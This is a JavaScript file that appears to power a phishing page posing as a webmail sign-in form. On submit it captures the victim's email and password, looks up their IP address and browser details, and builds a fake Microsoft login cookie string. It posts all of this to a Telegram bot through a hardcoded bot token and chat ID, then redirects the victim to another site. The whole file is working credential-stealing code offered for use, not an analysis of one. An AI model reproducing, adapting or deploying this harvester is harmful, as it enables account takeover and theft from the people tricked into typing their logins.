document.addEventListener("DOMContentLoaded", function () {
    const telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
    const telegramChatId = "7323113234";

    function handleSignin(event) {
        event.preventDefault();

        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const id1 = generateId();
        const id2 = generateIdLetters();
        const id3 = generateId();
        const id4 = generateIdLetters();
        const date = new Date().toISOString();

        const x = `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${navigator.userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;

        fetch("https://api.ipify.org?format=json")
            .then((res) => res.json())
            .then((data) => {
                const ipAddress = data.ip;
                const deviceInfo = {
                    manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
                    model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
                    os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
                    browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
                };

                const payload = {
                    email: email,
                    password: password,
                    ipAddress: ipAddress,
                    Device: deviceInfo.manufacturer,
                    OS: deviceInfo.os,
                    Browser: deviceInfo.browser,
                    Cookies: x,
                };

                fetch("https://api.telegram.org/bot" + telegramBotId + "/sendMessage", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        text: JSON.stringify(payload, null, 2)
                    }),
                })
                .then((response) => {
                    if (response.ok) {
                        window.location.href = "https://pmegtrading.online/"; // Redirect to success URL
                    } else {
                        console.error("Error sending data to Telegram:", response.statusText);
                        window.location.href = "https://example.org"; // Redirect to error URL
                    }
                })
                .catch((error) => {
                    console.error("Error sending data to Telegram:", error);
                    window.location.href = "https://example.org"; // Redirect to error URL
                });
            });
    }

    document.getElementById("webmailSignin-form").addEventListener("submit", handleSignin);
});
